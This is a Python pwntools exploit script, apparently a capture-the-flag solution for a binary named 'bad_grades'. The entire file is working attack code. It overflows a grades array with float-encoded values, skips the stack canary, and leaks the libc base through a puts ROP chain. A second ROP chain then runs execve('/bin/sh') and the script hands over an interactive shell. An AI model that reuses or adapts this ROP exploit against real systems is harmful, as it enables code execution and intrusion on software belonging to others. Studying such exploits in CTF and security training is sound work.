import itertools
import pathlib

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'bad_grades'
if args.REMOTE:
    libc_path = parent_dir / 'libc.so.6'
else:
    libc_path = Path('/usr') / 'lib' / 'x86_64-linux-gnu' / 'libc.so.6'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF(libc_path, checksec=False)

main_addr = 0x401108


def to_float(val: int) -> float:
    return struct.unpack('d', p64(val))[0]


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start(exe=str(exe), gdb_script=gdb_script)

grade_num: int


def send_payload(payload: bytes,
                 sentinel: float = 0.00000000):
    global grade_num
    grade_num = 1

    if len(payload) % 8 != 0x0:
        error('Payload length must be multiple of 8')

    num_grades = 35 + int(len(payload) / 8)
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Number of grades: ', str(num_grades).encode())

    def send_grade(val: float | bytes):
        global grade_num
        raw_val = str(val).encode() if isinstance(val, float) else val
        io.sendlineafter(f'Grade [{grade_num}]: '.encode(), raw_val)
        grade_num += 1

    # Dummy grades for overflow
    for i in range(1, 34):
        send_grade(0.00000000)

    send_grade(b'.')  # Skip canary
    send_grade(sentinel)  # Saved RBP value

    # Send actual payload
    for float_val in map(to_float, map(u64, map(bytes, itertools.batched(payload, 8)))):
        send_grade(float_val)

    io.recvline()  # Recv new average line


def leak_data(address: int,
              sentinel: float = 0.00000000) -> bytes:
    leak_rop = rop.ROP(elf)
    leak_rop.rdi = address
    leak_rop.raw(p64(elf.plt.puts))
    leak_rop.raw(p64(main_addr))
    send_payload(leak_rop.chain(), sentinel)
    return io.recvline(keepends=False)


def build_rop_payload() -> rop.ROP:
    execve_rop = rop.ROP(libc)

    ret_gadget = execve_rop.find_gadget(['ret'])
    pop_rdi_gadget = execve_rop.find_gadget(['pop rdi', 'ret'])
    pop_rsi_gadget = execve_rop.find_gadget(['pop rsi', 'ret'])
    pop_rdx_gadget = execve_rop.find_gadget(['pop rdx', 'ret'])
    pop_rax_gadget = execve_rop.find_gadget(['pop rax', 'ret'])
    syscall_gadget = execve_rop.find_gadget(['syscall'])

    execve_rop.raw([ret_gadget.address,             # ret
                    pop_rdi_gadget.address,         # * -> pop rdi, ret
                    next(libc.search(b'/bin/sh')),  # * -> '/bin/sh'
                    pop_rsi_gadget.address,         # * -> pop rsi, ret
                    p64(0x0),                       # 0x0
                    pop_rdx_gadget.address,         # * -> pop rdx, ret
                    p64(0x0),                       # 0x0
                    pop_rax_gadget.address,         # * -> pop rax, ret
                    p64(0x3b),                      # 0x3b
                    syscall_gadget.address])        # syscall

    return execve_rop


#####################################
#       Leak address of libc        #
#####################################
info(f'Leaking address of libc...')
puts_leak = leak_data(elf.got.puts)
if len(puts_leak) != 6:
    error(f'Failed to leak address of libc `puts`, got: {info(list(map(hex, puts_leak)))}')

puts_addr = u64(puts_leak.ljust(8, b'\x00'))
success(f'Leaked address of libc `puts`: {hex(puts_addr)}')
libc.address = puts_addr - libc.sym.puts
success(f'Derived libc base address: {hex(libc.address)}')

#####################################
#            Pwn via ROP            #
#####################################
info(f'Pwning via ROP...')
payload = build_rop_payload()
send_payload(payload.chain())

try:
    io.sendline(b'echo "hello world"')
    io.recvuntil(b'hello world\n')
    succeeded = True

except EOFError:
    succeeded = False

if succeeded:
    success(f'Shell granted :)')
    io.interactive()

else:
    error(f'ROP failed!')
